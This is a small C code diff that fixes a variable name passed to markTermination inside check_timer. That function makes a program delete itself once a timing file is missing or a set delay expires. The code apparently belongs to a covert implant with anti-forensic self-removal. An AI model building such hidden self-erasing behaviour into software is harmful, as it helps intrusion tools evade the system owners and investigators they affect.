@@ -31,7 +31,7 @@ void check_timer(char* filepath, unsigned long delete_delay)
 		//Added a self_delete, if you can't stat the file, it's gone as well as our timing information.
 		DLX(1, printf("No time file exists, self_delete will occur now...\n"));
 #if defined LINUX || SOLARIS
-		markTermination((char *)sdfpl);
+		markTermination((char *)sdlfp);
 #endif
 		self_delete();
 		exit( 0 );
@@ -44,7 +44,7 @@ void check_timer(char* filepath, unsigned long delete_delay)
 		if (timediff >= 0) {
 			if ( timediff > (time_t)delete_delay )
 			{
-				markTermination((char *)sdfpl);
+				markTermination((char *)sdlfp);
 				self_delete();
 				// not reached
 			}
